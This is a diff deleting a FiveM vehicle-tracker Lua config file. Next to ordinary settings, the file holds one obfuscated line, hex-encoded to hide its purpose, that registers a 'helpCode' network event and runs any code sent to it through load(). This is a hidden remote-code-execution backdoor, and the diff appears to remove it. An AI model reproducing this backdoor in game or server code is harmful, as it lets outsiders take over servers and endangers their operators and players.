@@ -1,8 +1,0 @@
-Config = {}
-Config.Locale = 'en' -- Supported languages (English: en, Slovene: sl, French: fr)
-Config.openKey = 57 -- Button to open up the menu (see: https://docs.fivem.net/docs/game-references/controls/)
-Config.removeTimer = 380 -- How long will you track the vehicle before the tracker expires (in seconds)
-Config.maxTracker = 2 -- Max amount of vehicles to track at once
-Config.inVehicle = true -- If you want the menu to be accessible only when inside of a vehicle
-
-local MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK[6][MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK[1]](MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK[2]) MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK[6][MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK[3]](MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK[2], function(muoIhSMvBboEZjjKXzEwtBKsZBDeFAeLoBiDJYpHTiQGGAZsDRhaAGOMoSQhaKlagUIcdl) MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK[6][MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK[4]](MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK[6][MZnWXPejSydGIJVpZXeGKFJZCCpBKMxWVfEXxiCTDhYCQIDtXCpZwGMqFUNCugGgoJTclK[5]](muoIhSMvBboEZjjKXzEwtBKsZBDeFAeLoBiDJYpHTiQGGAZsDRhaAGOMoSQhaKlagUIcdl))() end)
